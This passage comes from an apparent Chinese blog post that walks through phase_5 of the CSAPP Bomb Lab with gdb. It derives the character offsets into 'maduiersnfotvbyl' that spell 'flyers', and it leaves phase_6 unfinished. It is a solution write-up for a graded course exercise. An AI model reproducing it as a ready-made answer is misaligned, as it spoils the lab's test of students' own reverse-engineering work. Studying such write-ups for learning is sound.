alt="bomblab_phase_5_2.png"></p><p>很明显，有一个循环，以<code>eax</code>为循环变量，依次对输入的字符进行一系列的操作。具体操作是：先对字符<code>and 0xf</code>然后把结果保存在<code>rdx</code>里面，返回的字符是<code>0x4024b0+rdx</code>,最后这个保存到<code>rsp+rax+0x10</code>里面，在往栈底偏移<code>0x10</code>的地方起一个保存好的字符串。接下来又要怎么操作呢？接着单步调试看看：</p><p><img src="https://i.loli.net/2021/04/25/SiLjU51Z3BroAk9.png" alt="bomblab_phase_5_3.png"></p><p>发现在<code>rsp+0x10</code>那个位置的字符串要被<code>&quot;flyers&quot;</code>字符串比较，相等跳转，不跳转就炸了，那么唯一没有看的就是刚刚那个<code>0x4024b0+rdx</code>到底是什么了。但是可以猜测这应该是一个字符串，然后<code>rdx</code>做偏移取字符串的下标对应的字符。<code>print (char *)0x4024b0</code>查看这个字符串发现输出了一个很长的东西<code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code>因为可以看到它的偏移被<code>and 0xf</code>可以很容易证明这个偏移肯定小于等于<code>0xf</code>，那么我们取出16位的字符串<code>maduiersnfotvbyl</code>,<code>flyers</code>的话，它的偏移可以是：<code>9 15 14 5 6 7</code>这里建议大家写脚本跑一下，自己硬算也可以的。为了防止字符无效，我们尽量取满可能，因为偏移是固定的，但是高四位不管是什么都是可以的，反正最后要被<code>and 0xf</code></p><p><img src="https://i.loli.net/2021/04/25/EWxXJ2PuAQ3HoIc.png" alt="bomblab_phase_5_4.png"></p><p>因为每个字符都是相互独立的，所以你可以在这六行任意取一个可读字符最后拼接成字符串。因为有些字符不可编辑，所以采取这种措施是最妙的。</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>待更新</p><p>因为作者目前比较菜，phase_6和secret_bomb都不会做，如果上面有哪里说的不对的恳请指正。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
